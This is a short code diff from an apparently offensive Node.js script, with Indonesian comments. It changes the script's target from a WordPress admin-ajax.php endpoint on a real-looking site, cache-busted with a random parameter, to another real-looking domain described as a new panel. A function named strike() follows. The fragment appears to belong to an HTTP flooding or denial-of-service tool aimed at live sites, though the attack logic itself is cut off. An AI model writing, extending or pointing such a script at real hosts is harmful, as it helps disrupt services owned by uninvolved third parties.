@@ -1,7 +1,8 @@
 const https = require('https');
 
 // TARGET JANTUNG DATABASE (Halaman Pencarian)
-const target = 'https://tuntasonline.id/wp-admin/admin-ajax.php?action=' + Math.random().toString(36).substring(7);
+// Ganti target ke panel baru
+const target = 'https://freepanel.alfa-lyneen.my.id/';
 
 function strike() {
     const options = {
